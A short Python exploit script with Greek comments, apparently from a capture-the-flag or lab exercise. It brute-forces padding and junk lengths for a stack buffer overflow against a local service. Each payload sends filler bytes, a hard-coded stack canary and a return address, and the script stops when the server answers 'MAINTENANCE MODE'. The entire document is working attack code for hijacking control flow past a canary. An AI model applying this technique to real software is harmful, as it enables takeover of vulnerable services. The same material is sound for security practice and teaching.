import socket

host, port = '127.0.0.1', 28285
canary = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00"
addr = b"\x26\x92\x04\x08"

print("--- Starting Remote Sniper Scan ---")
# Δοκιμάζουμε padding γύρω από το 122 (114 έως 130)
for pad in range(114, 131):
    print(f"Testing Pad {pad}...", end="\r")
    for junk in range(0, 44, 4):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect((host, port))
            
            # Στέλνουμε το payload
            payload = b"A" * pad + canary + b"B" * junk + addr + b"\n"
            s.sendall(payload)
            
            # Αν πετύχει, ο server θα απαντήσει με "MAINTENANCE MODE"
            response = s.recv(1024)
            if b"MAINTENANCE" in response:
                print(f"\n\n[!!!] SUCCESS!")
                print(f"USE THIS PAD: {pad}")
                print(f"USE THIS JUNK: {junk}")
                s.close()
                exit()
            s.close()
        except:
            continue
print("\n[!] Scan finished. No match found.")